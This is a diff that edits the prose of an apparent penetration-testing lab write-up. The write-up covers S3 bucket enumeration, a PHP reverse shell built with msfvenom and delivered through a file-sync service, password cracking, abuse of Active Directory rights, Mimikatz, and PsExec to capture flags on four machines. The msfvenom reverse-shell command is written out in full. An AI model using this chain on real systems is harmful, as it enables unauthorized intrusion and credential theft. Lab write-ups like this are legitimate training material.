@@ -46,25 +46,25 @@ Ping sweeping the subnet to find four machines.
 
 ![](assets/Pasted%20image%2020250228111044.png)
 
-With feroxbuster we discover /storage
+With feroxbuster, we discover /storage.
 
 ![](assets/Pasted%20image%2020250228120317.png)
 
 ![](assets/Pasted%20image%2020250228120343.png)
 
-We can see those csv with curl
+We can see those CSV files with curl.
 
 ![](assets/Pasted%20image%2020250228121300.png)
 
-And get 4 users
+And get four users.
 
-This is a s3 bucket, let's enumera it.
+This is an S3 bucket. Let's enumerate it.
 
 ![](assets/Pasted%20image%2020250228153615.png)
 
 ![](assets/Pasted%20image%2020250228153544.png)
 
-We can upload objects so we ca try to upload a reverse shell.
+We can upload objects, so we can try to upload a reverse shell.
 
 ```bash
 msfvenom -p php/reverse_php LHOST=192.168.45.191 LPORT=6666 -o shell.php
@@ -78,33 +78,33 @@ msfvenom -p php/reverse_php LHOST=192.168.45.191 LPORT=6666 -o shell.php
 
 ![](assets/Pasted%20image%2020250228111901.png)
 
-We enter the service on the web server and a cloudsync login appears, we use the handed credentials to log in.
+We enter the service on the web server, and a CloudSync login appears. We use the provided credentials to log in.
 
 ![](assets/Pasted%20image%2020250228123326.png)
 
 ![](assets/Pasted%20image%2020250228123348.png)
 
-Clicking sync files 
+Clicking "Sync Files."
 
 ![](assets/Pasted%20image%2020250228123427.png)
 
 ### Initial Access
 
-Due to bad permissions on the bucket this service syncs from, we upload a reverse shell. Now if we sync, we pull the shell.
+Due to bad permissions on the bucket this service syncs from, we upload a reverse shell. Now, if we sync, we pull the shell.
 
 ![](assets/Pasted%20image%2020250228160002.png)
 
-We can access it and receive it with nc.
+We can access it and receive it with `nc`.
 
 ![](assets/Pasted%20image%2020250228160220.png)
 
 ### Post Exploitation
 
-Get the flag
+Get the flag.
 
 ![](assets/Pasted%20image%2020250228160705.png)
 
-We can see aws keys
+We can see AWS keys.
 
 ![](assets/Pasted%20image%2020250228160515.png)
 
@@ -121,19 +121,19 @@ $s3Client = new S3Client([
 ]);
 ```
 
-And enumerate domain users
+And enumerate domain users.
 
 ![](assets/Pasted%20image%2020250228161150.png)
 
-Using that key and configure an aws cli profile shows that is a root account but there is nothing inside.
+Using that key and configuring an AWS CLI profile shows that it is a root account, but there is nothing inside.
 
-We can access the mysql db using root.
+We can access the MySQL database using root.
 
 ![](assets/Pasted%20image%2020250228200705.png)
 
-Table cloudsync has some users, let's try to break the passwords.
+The `cloudsync` table has some users. Let's try to crack the passwords.
 
-We recovered 6
+We recovered six.
 
 ![](assets/Pasted%20image%2020250228200951.png)
 
@@ -150,11 +150,11 @@ We can use bloodhound-python to scout the AD.
 
 ![](assets/Pasted%20image%2020250228204421.png)
 
-Now import it into bh, we can see jeff.borrows has  a  generic all to mario.lemiux.
+Now import it into BloodHound. We can see `jeff.borrows` has a "Generic All" to `mario.lemieux`.
 
 ![](assets/Pasted%20image%2020250228204535.png)
 
-Change mario's passwords
+Change Mario's password.
 
 ![](assets/Pasted%20image%2020250228205948.png)
 
@@ -166,23 +166,23 @@ Change mario's passwords
 
 ### Initial Access
 
-Using mario.lemieux and the new password.
+Using `mario.lemieux` and the new password.
 
 ![](assets/Pasted%20image%2020250228210102.png)
 
 ### Privilege Escalation
 
-mario has admin privs so transfer mimikatz and get administrator.
+Mario has admin privileges, so transfer Mimikatz and get the administrator.
 
 ![](assets/Pasted%20image%2020250228210941.png)
 
-Reenter with administrator, but with interactive password.
+Reenter with the administrator, but with an interactive password.
 
 ![](assets/Pasted%20image%2020250228212839.png)
 
 ### Post Exploitation
 
-Get the flag
+Get the flag.
 
 ![](assets/Pasted%20image%2020250228213743.png)
 
@@ -194,12 +194,12 @@ Get the flag
 
 ### Initial Access
 
-Using administrator creds from ms02 (it's a domain admin), use psexec with interactive password.
+Using administrator credentials from MS02 (it's a domain admin), use PsExec with an interactive password.
 
 ![](assets/Pasted%20image%2020250228214130.png)
 
 ### Post Exploitation
 
-Get the flag
+Get the flag.
 
 ![](assets/Pasted%20image%2020250228214402.png)
